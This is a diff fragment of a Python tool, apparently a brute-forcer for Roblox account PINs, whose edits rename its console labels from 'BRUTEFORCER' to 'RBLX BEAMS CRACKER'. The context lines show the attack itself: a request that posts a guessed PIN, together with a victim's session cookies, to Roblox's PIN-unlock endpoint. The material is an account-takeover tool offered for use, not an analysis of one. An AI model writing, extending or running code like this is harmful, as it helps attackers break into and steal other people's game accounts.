@@ -31,7 +31,7 @@ class Crack:
             print("[", end="")
             cprint(" ERROR ", "red", end="")
             print("] " , end="")
-            cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')
+            cprint("RBLX BEAMS CRACKER Had A Fatal Error. Diagnosing issue", 'red')
 
             check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
             response = check.json()
@@ -57,7 +57,7 @@ class Crack:
           "error": ["ERROR", "red"],
           "diagnostic": ["DIAGNOSTIC", "red"],
           "ratelimit": ["RATELIMITED", "yellow"],
-          None: ["BRUTEFORCER", "magenta"],
+          None: ["RBLX BEAMS CRACKER", "magenta"],
 
         }
 
@@ -65,7 +65,7 @@ class Crack:
             title = key[type][0]
             color = key[type][1]
         else:
-            title = "BRUTEFORCER"
+            title = "RBLX BEAMS CRACKER"
             color = type
 
         print("[", end="")
